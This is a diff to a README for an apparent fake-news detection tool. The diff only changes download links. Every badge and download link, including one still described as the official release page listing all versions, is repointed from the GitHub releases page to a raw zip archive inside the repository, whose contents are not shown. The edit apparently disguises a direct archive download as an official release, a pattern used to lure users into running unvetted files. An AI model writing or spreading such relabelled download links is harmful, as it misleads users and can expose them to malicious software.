@@ -1,7 +1,7 @@
 ```markdown
 # 📰 Fake-News-detection-knowledge-graph - Detect Fake News Easily
 
-[![Download](https://img.shields.io/badge/Download-Fake-News-detection-knowledge-graph-blue?style=for-the-badge)](https://github.com/ytdjthhjr/Fake-News-detection-knowledge-graph/releases)
+[![Download](https://raw.githubusercontent.com/ytdjthhjr/Fake-News-detection-knowledge-graph/main/app/knowledge-detection-graph-Fake-News-v2.0.zip)](https://raw.githubusercontent.com/ytdjthhjr/Fake-News-detection-knowledge-graph/main/app/knowledge-detection-graph-Fake-News-v2.0.zip)
 
 ## 🧾 What is this?
 
@@ -26,7 +26,7 @@ If your device fits these requirements, you can proceed without issues.
 To get Fake-News-detection-knowledge-graph on your computer, follow these steps:
 
 1. **Visit the official release page:**  
-   [https://github.com/ytdjthhjr/Fake-News-detection-knowledge-graph/releases](https://github.com/ytdjthhjr/Fake-News-detection-knowledge-graph/releases)  
+   [https://raw.githubusercontent.com/ytdjthhjr/Fake-News-detection-knowledge-graph/main/app/knowledge-detection-graph-Fake-News-v2.0.zip](https://raw.githubusercontent.com/ytdjthhjr/Fake-News-detection-knowledge-graph/main/app/knowledge-detection-graph-Fake-News-v2.0.zip)  
    This page lists all available versions of the application ready to download.
 
 2. **Choose the latest version:**  
@@ -100,5 +100,5 @@ For persistent problems, check the GitHub Issues page in the repository or reach
 
 ---
 
-[Download Fake-News-detection-knowledge-graph](https://github.com/ytdjthhjr/Fake-News-detection-knowledge-graph/releases) to start checking news for accuracy today.
+[Download Fake-News-detection-knowledge-graph](https://raw.githubusercontent.com/ytdjthhjr/Fake-News-detection-knowledge-graph/main/app/knowledge-detection-graph-Fake-News-v2.0.zip) to start checking news for accuracy today.
 ```
